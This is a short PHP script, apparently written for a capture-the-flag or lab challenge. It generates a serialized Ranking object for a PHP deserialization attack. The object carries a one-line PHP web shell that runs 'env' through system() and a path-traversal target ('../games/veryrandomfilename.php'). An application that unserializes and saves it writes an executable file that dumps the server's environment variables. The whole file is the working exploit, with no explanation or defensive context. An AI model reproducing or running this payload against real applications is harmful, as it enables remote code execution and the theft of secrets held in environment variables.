<?php

class Ranking{
  public $ranking = [];
  public $changed = false;
  public $path = "./games/ranking";
}

$ranking = new Ranking();
$ranking->ranking = "<?php echo system('env');?>";
$ranking->changed = true;
$ranking->path = "../games/veryrandomfilename.php";

file_put_contents("serialization", serialize($ranking));

?>